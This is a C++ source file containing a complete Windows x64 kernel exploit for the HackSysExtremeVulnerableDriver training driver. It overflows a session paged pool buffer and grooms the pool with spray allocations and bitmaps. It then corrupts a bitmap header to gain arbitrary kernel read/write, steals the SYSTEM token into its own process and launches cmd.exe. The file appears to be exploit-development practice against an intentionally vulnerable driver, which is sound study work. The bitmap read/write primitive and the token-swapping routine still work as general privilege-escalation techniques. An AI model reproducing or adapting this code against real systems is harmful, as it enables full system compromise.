// HEVD-ArbitraryWrite-Bitmap-x64.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <Windows.h>
#include <psapi.h>

#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004

#define SystemExtendedHandleInformation 0x40
#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define SIZE_BUF 0x250
//#define SIZE_BUF 588+4
#define HEVD_IOCTL_BUFFER_OVERFLOW_PAGED_POOL_SESSION            IOCTL(0x810)
#define N 10
#define OFFSET 0x200
#define BITMAP_OFFSET 0xd70



typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
{
	PVOID Object;
	ULONG_PTR UniqueProcessId;
	HANDLE HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct
{
	DWORD UniqueProcessIdOffset;
	DWORD TokenOffset;
} VersionSpecificConfig;

typedef struct _SYSTEM_EXTENDED_HANDLE_INFORMATION
{
	ULONG_PTR NumberOfHandles;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_EXTENDED_HANDLE_INFORMATION, * PSYSTEM_EXTENDED_HANDLE_INFORMATION;

typedef struct _SPRAYER_OBJ {
	HGLOBAL hmem;
	HANDLE handle;
} SPRAYER;

typedef NTSTATUS(NTAPI* PtrNtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

typedef HANDLE(WINAPI* ZwUserConvertMemHandle)(BYTE* buf, DWORD size);
ZwUserConvertMemHandle pfnUserConvertMemHandle = 0;
BOOL go = FALSE;
HBITMAP* hbitmap3 = new HBITMAP[0x4000];
BYTE* pbits;
int index_pwnedBitmap;
HBITMAP pwnedBitmap, manager, worker;
VersionSpecificConfig gConfig = { 0x2e0, 0x358 };
PDWORD64 g_pointer;
DWORD g_bitsCount;

SPRAYER AllocateOnSessionPool(unsigned int size) {
	SPRAYER s;
	if (!pfnUserConvertMemHandle) {
		pfnUserConvertMemHandle = (ZwUserConvertMemHandle)GetProcAddress(LoadLibrary(L"win32u.dll"), "NtUserConvertMemHandle");
		if (!pfnUserConvertMemHandle) {
			// on win8.1 this function is located in user32.dll
			pfnUserConvertMemHandle = (ZwUserConvertMemHandle)GetProcAddress(LoadLibrary(L"user32.dll"), "NtUserConvertMemHandle");
			if (!pfnUserConvertMemHandle) {
				printf("could not find win32u!NtUserConvertMemHandle. exiting.\n");
				s.handle = 0;
				s.hmem = 0;
				return s;
			}
		}
		//printf("pfnUserConvertMemHandle @ 0x%llx\n", (UINT64)pfnUserConvertMemHandle);
	}
	/*
	alloc_size will be passed to HMAllocObject, i.e. pool buffer will be preceded by 0x10 bytes header - that's why we calc -0x10
	the -0x14 comes from win32kfull!ConvertMemHandle  (lea r9d, [rdi+14h])
	*/
	
	int alloc_size = size - 0x14;
	BYTE* buffer = (BYTE*)malloc(alloc_size);
	memset(buffer, 0x41, alloc_size);
	s.hmem = GlobalAlloc(GMEM_MOVEABLE, size);
	BYTE* buf = (BYTE*)GlobalLock(s.hmem);
	memcpy(buf, buffer, alloc_size);
	s.handle = pfnUserConvertMemHandle(buf, alloc_size);
	GlobalUnlock(s.hmem);
	return s;
}

void FreeFromSessionPool(HANDLE hMem) {
	/*
	for some reason, this doesn't work. TODO!
	*/
	SetClipboardData(CF_TEXT, hMem);
	EmptyClipboard();
	CloseClipboard();
}

DWORD64 readQword(DWORD64 addr) {
	DWORD64 value;
	g_pointer[10] = addr;  
	g_pointer[9] = addr;
	SetBitmapBits(manager, g_bitsCount, pbits);
	GetBitmapBits(worker, 8, &value);
	return value;
}

void writeQword(DWORD64 addr, DWORD64 value) {
	BYTE* input = new BYTE[0x8];

	for (int i = 0; i < 8; i++)
	{
		input[i] = (value >> 8 * i) & 0xFF;
	}

	g_pointer[10] = addr;
	g_pointer[9] = addr;
	SetBitmapBits(manager, g_bitsCount, pbits);
	SetBitmapBits(worker, 0x8, input);
	return;
}
// Get base of ntoskrnl.exe
DWORD64 GetNTOsBase()
{
	DWORD64 Bases[0x1000];
	DWORD needed = 0;
	DWORD64 krnlbase = 0;
	if (EnumDeviceDrivers((LPVOID*)&Bases, sizeof(Bases), &needed)) {
		krnlbase = Bases[0];
	}
	return krnlbase;
}

DWORD64 PsInitialSystemProcess()
{
	// load ntoskrnl.exe
	DWORD64 ntos = (DWORD64)LoadLibraryA((LPCSTR)"ntoskrnl.exe");
	// get address of exported PsInitialSystemProcess variable
	DWORD64 addr = (DWORD64)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	FreeLibrary((HMODULE)ntos);
	DWORD64 res = 0;
	DWORD64 ntOsBase = GetNTOsBase();
	// subtract addr from ntos to get PsInitialSystemProcess offset from base
	if (ntOsBase) {
		res = readQword(addr - ntos + ntOsBase);
	}
	return res;
}

// Get EPROCESS for current process
DWORD64 PsGetCurrentProcess()
{
	DWORD64 pEPROCESS = PsInitialSystemProcess();// get System EPROCESS

	// walk ActiveProcessLinks until we find our Pid

	DWORD64 flink = readQword(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(DWORD64));

	DWORD64 res = 0;

	while (TRUE) {
		DWORD64 UniqueProcessId = 0;

		// adjust EPROCESS pointer for next entry
		pEPROCESS = (flink)-gConfig.UniqueProcessIdOffset - sizeof(DWORD64);
		// get pid
		UniqueProcessId = readQword(pEPROCESS + gConfig.UniqueProcessIdOffset);
		// is this our pid?
		if (GetCurrentProcessId() == UniqueProcessId) {
			res = pEPROCESS;
			break;
		}
		// get next entry
		flink = readQword(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(DWORD64));
		// if next same as last, we reached the end
		if (pEPROCESS == (flink)-gConfig.UniqueProcessIdOffset - sizeof(DWORD64))
			break;
	}
	return res;
}

void SwapTokens() {
	// get System EPROCESS
	DWORD64 SystemEPROCESS = PsInitialSystemProcess();
	printf("[+] system EPROCESS address: 0x%p\n", SystemEPROCESS);
	DWORD64 CurrentEPROCESS = PsGetCurrentProcess();
	printf("[+] current EPROCESS address: 0x%p\n", CurrentEPROCESS);
	// read token from system process
	DWORD64 SystemToken = readQword(SystemEPROCESS + gConfig.TokenOffset);
	printf("[*] replacing token structure...\n");
	// write token to current process
	writeQword(CurrentEPROCESS + gConfig.TokenOffset, SystemToken);
	//printf("val: 0x%p\n",val);
}
void continuation_thread() {

	printf("[+] continuation thread waiting for signal...\n");
	while (!go)
		Sleep(100);

	// now we're in the overflow loop in the main thread. wait a bit to make sure we've hit the overflow
	Sleep(5000);

	printf("[+] now check overflow success in continuation thread\n");
	printf("[*] pwned bitmap: 0x%p at index: %d\n", hbitmap3[index_pwnedBitmap], index_pwnedBitmap);
	pwnedBitmap = hbitmap3[index_pwnedBitmap];
	//setting manager and worker
	manager = hbitmap3[index_pwnedBitmap + 1];
	worker = hbitmap3[index_pwnedBitmap + 2];
	g_pointer = (PDWORD64)(pbits + BITMAP_OFFSET + 0x20);	//g_pointer points to beginning of the worker bitmap header in the pbits BYTE array
	g_pointer[0] = (DWORD64)worker;
	g_pointer[4] = (DWORD64)worker;
	g_pointer[8] = 0xd70;
	g_bitsCount = BITMAP_OFFSET + 0x10 + 0x10 + 0x38 + 0x8 + 0x8 * 3;  //setting number of bits to pass to SetBitmapBits called on manager
	SwapTokens();
	system("cmd.exe");
	printf("ended thread\n");
}




int main()
{
	int i, j;
	DWORD bytesRet;
	DWORD h;

	DWORD pid = GetCurrentProcessId();
	SPRAYER* bigHandles = new SPRAYER[0x400];
	SPRAYER* littleHandles = new SPRAYER[0x6000];
	ULONG retLen;
	LoadLibraryA("user32.dll");
	PSYSTEM_EXTENDED_HANDLE_INFORMATION buffer = (PSYSTEM_EXTENDED_HANDLE_INFORMATION)VirtualAlloc((LPVOID)0x1a000000, 0x10000*sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memset(buffer, 0, 0x1000);

	DWORD64 size = 0x10000000 - 0x270;
	HANDLE tpesudoHandle = GetCurrentThread();
	HANDLE trealHandle;
	DWORD64 tKaddr = 0;
	DWORD procId = GetCurrentProcessId();
	pbits = new BYTE[0x2000];
	DWORD tid;


	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)continuation_thread, 0, 0, &tid);

	DuplicateHandle(
		GetCurrentProcess(),
		tpesudoHandle,
		GetCurrentProcess(),
		&trealHandle,
		    NULL,
		     NULL,
		    0x1
	);
	printf("0x%p\n", trealHandle);
	PtrNtQuerySystemInformation pNtQuerySystemInformation = (PtrNtQuerySystemInformation)GetProcAddress(
		GetModuleHandle(TEXT("ntdll.dll")),
		"NtQuerySystemInformation");

	
	pNtQuerySystemInformation(
		SystemExtendedHandleInformation,
		buffer,
		0x10000 * sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX),
		NULL);

	for (i = 0; i < buffer->NumberOfHandles; i++) {
		if ((buffer->Handles[i]).UniqueProcessId == procId && (buffer->Handles[i]).HandleValue == trealHandle) {
			printf("0x%p\n", (buffer->Handles[i]).HandleValue);
			tKaddr = (DWORD64)(buffer->Handles[i]).Object;
			break;
		}
	}
	printf("tAddr: 0x%p\n", tKaddr);

	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

	//Allocating pool chunks of size 0xff0. Defragmenting pool at page level
	for (int i = 0; i < 0x400; i++) {
		bigHandles[i] = AllocateOnSessionPool(0xfe0);
	}
	/* just for debugging
	printf("lastBigAllocs\n");
	for (i = 0x390; i < 0x400; i++) {
		printf("0x%p,\n", bigHandles[i].handle);
	}
	*/
	//Allocating pool chunks of size 0x210. Defragmenting pool with objects of size equal to vulnerable object size
	for (i = 0; i < 0x5000; i++) {
		littleHandles[i] = AllocateOnSessionPool(0x200);
	}
	/* just for debugging
	printf("lastlittleAllocs\n");
	for (i = 0xf90; i < 0x1000; i++) {
		printf("0x%p,\n", littleHandles[i].handle);
	}
	*/
	
	/*Allocating groups of bitmaps:
	* first one of size 0xdf0, before the vulnerable object.
	* second one is pawned bitmap.
	* third one is manager.
	* fourth one is worker.
	*/
	for (i = 0; i < 0x2000; i++) {
		hbitmap3[i] = CreateBitmap(1, 0x2dc, 1, 1, 0);
		if (hbitmap3[i] == NULL) {
			printf("bitmap %d == NULL\n", i);
			break;
		}
		else if (i == 0)
			printf("0x%p\n", hbitmap3[i]);
		hbitmap3[i + 1] = CreateBitmap(1, 0x35c, 1, 32, 0);
		if (hbitmap3[i+1] == NULL) {
			printf("bitmap %d == NULL\n", i+1);
			break;
		}
		else if (i == 0)
			printf("0x%p\n", hbitmap3[i+1]);
		hbitmap3[i + 2] = CreateBitmap(1, 0x35c, 1, 32, 0);
		if (hbitmap3[i+2] == NULL) {
			printf("bitmap %d == NULL\n", i+2);
			break;
		}
		hbitmap3[i + 3] = CreateBitmap(1, 0x35c, 1, 32, 0);
		if (hbitmap3[i+3] == NULL) {
			printf("bitmap %d == NULL\n", i+3);
			break;
		}
		i = i + 3;
	}
	/* For debugging
	printf("bitmap handles\n");
	for (i = 0x1f90; i < 0x2000; i++) {
		printf("0x%p,\n", hbitmap3[i]);
	}
	*/

	//Filling some holes in the groups of 4 bitmaps objects
	for (i = 0x5000; i < 0x5500; i++) {
		littleHandles[i] = AllocateOnSessionPool(0x200);
	}
	/* For debugging
	printf("lastlittleAllocs\n");
	for (i = 0x5490; i < 0x5500; i++) {
		printf("0x%p,\n", littleHandles[i].handle);
	}
	*/
	SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);


	HANDLE device = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);



	if (device == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to open handle to device.");
		return -1;
	}

	printf("[+] Opened handle to device: 0x%8p\n", device);

	

	char* uBuffer = (char*)VirtualAlloc(
		NULL,
		SIZE_BUF,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (uBuffer == NULL)
		return -2;

	printf("[+] User buffer allocated: 0x%8p\n", uBuffer);
	//filling buffer with 0x41
	memset(uBuffer, 0x41, OFFSET);
	DWORD64 pool_header[] = { 0x3530684723ff0000,0x0 };
	DWORD64 bitmap_header[] = { 0x1,0x0,tKaddr,0x0,0x1,0x0,0x0 };

	//copying into buffer pool header of the pwned bitmap object
	memcpy(uBuffer + OFFSET, &pool_header, 0x10);
	//copying into buffer bitmap header (till sizlBitmap field. sizlBitmap is excluded)
	memcpy(uBuffer + OFFSET + 0x10, &bitmap_header, 0x38);
	//Setting sizlBitmap to a greater value
	*(DWORD64*)(uBuffer + OFFSET + 0x10 + 0x38) = 0x0000133800000001;

	DeviceIoControl(
		device,
		HEVD_IOCTL_BUFFER_OVERFLOW_PAGED_POOL_SESSION,
		uBuffer,
		SIZE_BUF,
		NULL,
		0,
		&bytesRet,
		NULL
	);
	//setting pbits to use with pwned bitmap in order to control the manager

	memset(pbits, 0x41, BITMAP_OFFSET);
	PDWORD64 pointer = (PDWORD64)(pbits + BITMAP_OFFSET);  //pointer now points to beginning of the pool header of the free chunk
	pool_header[0] = 0x00000000000100ff;
	memcpy(pointer, &pool_header, 0x10);		//adding free chunk's pool header to pbits buffer
	pointer += 2;
	pool_header[0] = 0x3530684723ff0000;		
	memcpy(pointer, &pool_header, 0x10);		//adding manager's pool header to pbits buffer
	pointer += 2;
	memcpy(pointer, &bitmap_header,0x38);		//adding bitmap header to pbits buffer (sizlBitmap excluded)
	pointer[7] = 0x0000133800000001;			//adding sizlBitmap field with higher value

	go = TRUE;									//waking up continuation_thread
	

	/*In this cycle will be overflowed the manager through the compromised bitmap, by calling setBitmapBits with pbits as an argument.
	* After the call the current thread will enter in a deadlock state.
	* For this reason first was waken up the continuation_thread.
	* At every iteration the global variable index_pwnedBitmap will be update. In this way the continuation thread will know
	* the position of the pwned bitmap in the array hbitmap3.
	* In addition, is required to change everytime the handler value in the bitmap header with the correct one, to not enter again in a deadlock.
	*/
	//At this point the pointer variable points to the beginning of the bitmap header.
	for (int i = 0xc01; i < 0x2000; i = i + 4) {
		index_pwnedBitmap = i;					//update global variable
		pointer[0] = (DWORD64)hbitmap3[i + 1]; //updating the header field with the correct value
		pointer[4] = (DWORD64)hbitmap3[i + 1]; //same operation as the previous one
		if (SetBitmapBits(hbitmap3[i], BITMAP_OFFSET+0x10+0x10+0x38+0x8, pbits) == (BITMAP_OFFSET + 0x10 + 0x10 + 0x38 + 0x8)) { //when this function will be called on the pwned bitmap
			printf("found bitmap at index %d\n", i);																			 //the thread will enter in deadlock.
			break;
		}
	}
	Sleep(-1);
	/*
	for (i = 0; i < 0x5500; i++) {
		if (GlobalFree(littleHandles[i].hmem) != NULL)
			printf("error freeing handle %d\n");
		if (i < 0x400)
			if (GlobalFree(bigHandles[i].hmem) != NULL)
				printf("error freeing handle %d\n");
		if (i < 0x2000)
			DeleteObject(hbitmap3[i]);
	}

	printf("ciao\n");
	*/

}